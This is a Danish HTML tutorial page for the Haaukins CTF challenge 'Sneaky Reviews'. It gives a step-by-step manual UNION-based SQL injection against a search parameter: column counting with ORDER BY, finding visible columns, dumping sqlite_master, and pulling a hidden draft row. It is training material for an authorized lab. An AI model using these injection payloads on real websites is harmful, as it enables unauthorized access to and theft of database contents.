@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Sneaky Reviews — tutorial (UNION SQL injection)</title>
+<meta name="description" content="Guide til Haaukins Sneaky Reviews: manuel UNION-baseret SQL injection — ORDER BY for kolonne-antal, UNION SELECT for synlige kolonner, dump sqlite_master og den skjulte draft-review.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Sneaky Reviews</h1>
+<p class="subtitle">Manuel UNION-SQLi fra bunden — dump en skjult database-række.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>En Flask ToDo-app med søgning <code>GET /search?s=...</code>. Flaget ligger i en <strong>skjult</strong>
+             database-række.</p>
+<h2>Trin for trin</h2>
+<pre><code>/search?s=x'                       # HTTP 500 => injicerbar
+/search?s=x' ORDER BY 5-- -        # ok; 6 fejler => 5 kolonner
+/search?s=x' UNION SELECT 111,222,333,444,555-- -   # 111,222,333 vises
+# dump skema (SQLite):
+/search?s=x' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type='table'-- -
+# den skjulte draft-review:
+/search?s=x' UNION SELECT id,text,note,4,5 FROM reviews WHERE draft=1-- -</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flaget lå i <code>note</code>-kolonnen på en <code>draft=1</code>-review (skjult i UI'et).</p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><code>'</code>→fejl = injection; <code>ORDER BY N</code> finder kolonne-antal; <code>UNION SELECT</code> finder synlige kolonner.</li><li><code>sqlite_master.sql</code> giver hele schemaet.</li><li>Kig efter skjulte felter/rækker (draft, note, is_admin).</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
